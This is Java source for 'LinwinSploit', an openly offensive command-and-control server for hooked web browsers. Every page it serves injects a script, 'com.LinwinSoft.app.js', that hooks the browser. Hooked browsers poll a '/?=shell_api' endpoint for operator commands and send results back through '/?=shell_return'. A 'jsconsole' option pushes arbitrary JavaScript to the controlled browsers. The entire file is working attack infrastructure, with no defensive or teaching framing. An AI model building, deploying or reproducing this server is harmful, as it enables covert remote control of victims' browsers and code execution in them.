
import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class SocketServer {
    public static boolean connect = false;
    public static String sendCommand = "none";
    public static void main(String[] args) {
        Thread options = new Thread(new Runnable() {
            @Override
            public void run() {
                System.out.println("Enter 'help' to get more help information.");
                while (true) {
                    System.out.print("LinwinSploit (web/attack/trojan_virus) $ ");
                    Scanner scanner = new Scanner(System.in);
                    String command = scanner.nextLine();

                    if (command.equals("help")) {
                        System.out.println(" |-Help-|\n" +
                                " 1. jsconsole                      Run javascript on control browser.\n");
                        continue;
                    }
                    if (command.equals("jsconsole")) {
                        System.out.print("LinwinSploit (web/attack/trojan_virus) [JsConsole] $ ");
                        Scanner scanner1 = new Scanner(System.in);
                        String javascript = scanner1.nextLine();
                        SocketServer.sendCommand = "js: "+javascript;
                        continue;
                    }
                    else {
                        SocketServer.sendCommand = command;
                    }
                }
            }
        });
        options.start();

        try {
            ExecutorService executorService = Executors.newFixedThreadPool(100);
            int port = Integer.parseInt(args[0]);
            ServerSocket serverSocket = new ServerSocket(port);

            while (true) {
                Socket socket = serverSocket.accept();
                Future<Integer> future = executorService.submit(new Callable<Integer>() {
                    @Override
                    public Integer call(){
                        try{

                            SocketServer.connect = true;
                            OutputStream outputStream = socket.getOutputStream();
                            InputStream inputStream = socket.getInputStream();

                            PrintWriter printWriter = new PrintWriter(outputStream);
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                            String requests = bufferedReader.readLine();
                            requests = java.net.URLDecoder.decode(requests);
                            String url = requests.substring(requests.indexOf(" ")+1,requests.lastIndexOf("H")-1);

                            if (url.equals("/?=shell_api")){
                                printWriter.println("HTTP/1.1 200 OK");
                                printWriter.println("Content-Type: text/plain");
                                printWriter.println();
                                printWriter.println(SocketServer.sendCommand);
                                printWriter.flush();
                                socket.close();
                            }
                            if (url.startsWith("/?=shell_return")) {
                                System.out.println(url.substring(url.indexOf(" ")+1));
                                printWriter.println("HTTP/1.1 200 OK");
                                printWriter.println("Content-Type: text/plain");
                                printWriter.println();
                                printWriter.flush();
                                socket.close();
                            }
                            if (url.equals("/com.LinwinSoft.app.js")) {
                                printWriter.println("HTTP/1.1 200 OK");
                                printWriter.println("Content-Type: application/javascript");
                                printWriter.println();
                                try {
                                    FileReader fileReader = new FileReader("../../com.LinwinSoft.app.js");
                                    BufferedReader bufferedReader1 = new BufferedReader(fileReader);
                                    while (true) {
                                        String line = bufferedReader1.readLine();
                                        if (line == null) {
                                            break;
                                        }
                                        printWriter.println(line);
                                        printWriter.flush();
                                    }
                                    fileReader.close();
                                    bufferedReader1.close();
                                    socket.close();
                                }catch (Exception exception){
                                    exception.printStackTrace();
                                }
                            }
                            else {
                                printWriter.println("HTTP/1.1 200 OK");
                                printWriter.println("Content-Type: text/html");
                                printWriter.println();
                                printWriter.println("<script src='com.LinwinSoft.app.js'></script>");
                                printWriter.flush();
                                socket.close();
                            }
                            SocketServer.sendCommand = "none";
                        }catch (Exception exception){
                            //exception.printStackTrace();
                            try {
                                socket.close();
                            }catch (Exception exception1){
                                exception1.printStackTrace();
                            }
                        }

                        return 0;
                    }
                });
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
            System.out.println("ERROR"+exception.getMessage());
            System.exit(1);
        }
    }
}
